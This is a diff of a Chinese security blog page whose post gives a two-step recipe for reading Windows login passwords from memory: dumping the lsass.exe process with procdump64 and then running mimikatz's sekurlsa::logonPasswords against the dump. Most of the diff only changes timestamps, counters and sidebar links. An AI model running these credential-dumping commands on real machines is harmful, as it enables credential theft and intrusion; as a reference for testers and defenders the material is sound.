@@ -93,7 +93,7 @@
 <meta property="og:site_name" content="MaiKeFee|">
 <meta property="og:description" content="两步完成利用procdump64+mimikatz获取win用户密码使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp (注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump lsa">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-03T11:58:05.266Z">
+<meta property="og:updated_time" content="2019-09-03T12:37:15.297Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="两步完成利用procdump64+mimikatz获取win用户密码">
 <meta name="twitter:description" content="两步完成利用procdump64+mimikatz获取win用户密码使用procdump64+mimikatz可实现从内存中获取明文密码1.导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp (注:必须使用管理员权限) 2.执行mimikatzmimikatz.exe  &amp;quot;sekurlsa::minidump lsa">
@@ -357,7 +357,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T19:58:05+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T20:37:15+08:00">
                 2019-09-03
               </time>
             
@@ -451,7 +451,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  102
+                  86
                 </span>
               
 
@@ -490,8 +490,7 @@
       
         <h1 id="两步完成利用procdump64-mimikatz获取win用户密码"><a href="#两步完成利用procdump64-mimikatz获取win用户密码" class="headerlink" title="两步完成利用procdump64+mimikatz获取win用户密码"></a>两步完成利用procdump64+mimikatz获取win用户密码</h1><h2 id="使用procdump64-mimikatz可实现从内存中获取明文密码"><a href="#使用procdump64-mimikatz可实现从内存中获取明文密码" class="headerlink" title="使用procdump64+mimikatz可实现从内存中获取明文密码"></a>使用procdump64+mimikatz可实现从内存中获取明文密码</h2><h3 id="1-导出lsass-exe"><a href="#1-导出lsass-exe" class="headerlink" title="1.导出lsass.exe"></a>1.导出lsass.exe</h3><pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p> (注:必须使用管理员权限)</p>
 <h3 id="2-执行mimikatz"><a href="#2-执行mimikatz" class="headerlink" title="2.执行mimikatz"></a>2.执行mimikatz</h3><pre><code>mimikatz.exe  &quot;sekurlsa::minidump lsass.dmp&quot;  &quot;sekurlsa::logonPasswords full&quot;  exit</code></pre><p>(注:必须使用管理员权限)</p>
-<h3 id="成功获取明文密码"><a href="#成功获取明文密码" class="headerlink" title="成功获取明文密码"></a>成功获取明文密码</h3><p>原文:<a href="https://www.cnblogs.com/chenglee/p/9366399.html" target="_blank" rel="noopener">两步完成利用procdump64+mimikatz获取win用户密码</a></p>
-
+<h3 id="成功获取明文密码"><a href="#成功获取明文密码" class="headerlink" title="成功获取明文密码"></a>成功获取明文密码</h3>
       
     </div>
     
@@ -637,7 +636,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -648,7 +647,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -659,7 +658,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -703,6 +702,10 @@
         
         
           <li>
+            <a href="/archives/d0f5ccf3.html" title="SQL Sever手工注入及技术总计" target="_blank">SQL Sever手工注入及技术总计</a>
+          </li>
+        
+          <li>
             <a href="/archives/15af7f29.html" title="常见未授权访问漏洞总结" target="_blank">常见未授权访问漏洞总结</a>
           </li>
         
@@ -716,10 +719,6 @@
         
           <li>
             <a href="/archives/f86fa73d.html" title="两步完成利用procdump64+mimikatz获取win用户密码" target="_blank">两步完成利用procdump64+mimikatz获取win用户密码</a>
-          </li>
-        
-          <li>
-            <a href="/archives/694daf10.html" title="Phpmyadmin getshell" target="_blank">Phpmyadmin getshell</a>
           </li>
         
       </ul>
